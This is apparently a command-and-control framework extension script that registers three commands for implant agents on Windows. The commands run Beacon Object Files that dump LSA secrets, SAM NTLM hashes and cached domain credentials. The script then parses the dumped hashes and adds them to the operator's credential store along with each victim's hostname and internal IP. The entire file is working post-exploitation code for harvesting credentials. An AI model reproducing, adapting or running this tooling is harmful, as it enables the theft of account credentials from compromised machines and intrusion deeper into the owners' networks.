var metadata = {
    name: "LSAdump-BOF",
    description: "BOF tools for dumping LSA secrets, SAM hashes, and cached domain credentials"
};

/// COMMANDS

var cmd_lsadump_secrets = ax.create_command("lsadump_secrets", "Dump LSA secrets from SECURITY hive (requires SYSTEM)", "lsadump_secrets");
cmd_lsadump_secrets.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "_bin/lsadump_secrets." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "BOF: lsadump::secrets");
});


var cmd_lsadump_sam = ax.create_command("lsadump_sam", "Dump SAM hashes (requires admin)", "lsadump_sam");
cmd_lsadump_sam.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let hook = function (task) {
        let agent = ax.agents()[task.agent];
        let computer = agent["computer"];
        let address = agent["internal_ip"];

        let match;
        let regex = /^([a-zA-Z0-9_\-]+):(\d+):([a-fA-F0-9]{32})$/gm;
        while ((match = regex.exec(task.text)) !== null) {
            ax.credentials_add(match[1], match[3], "", "ntlm", "", "SAM", `${computer} (${address})`);
        }
        return task;
    }
    let bof_path = ax.script_dir() + "_bin/lsadump_sam." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "BOF: lsadump::sam", hook);
});


var cmd_lsadump_cache = ax.create_command("lsadump_cache", "Dump cached domain credentials (DCC2/MSCacheV2, requires SYSTEM)", "lsadump_cache");
cmd_lsadump_cache.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let hook = function (task) {
        let agent = ax.agents()[task.agent];
        let computer = agent["computer"];
        let address = agent["internal_ip"];

        let match;
        // Match: MsCacheV2 : <hash>
        let regex = /User\s+:\s+([^\\\n]+)\\([^\n]+)\nMsCacheV2\s+:\s+([a-fA-F0-9]{32})/gm;
        while ((match = regex.exec(task.text)) !== null) {
            let domain = match[1];
            let username = match[2];
            let hash = match[3];
            ax.credentials_add(username, hash, "", "dcc2", domain, "DCC2", `${computer} (${address})`);
        }
        return task;
    }
    let bof_path = ax.script_dir() + "_bin/lsadump_cache." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "BOF: lsadump::cache", hook);
});



var group_lsadump = ax.create_commands_group("LSAdump-BOF", [
    cmd_lsadump_secrets, cmd_lsadump_sam, cmd_lsadump_cache
]);
ax.register_commands_group(group_lsadump, ["beacon", "gopher"], ["windows"], []);
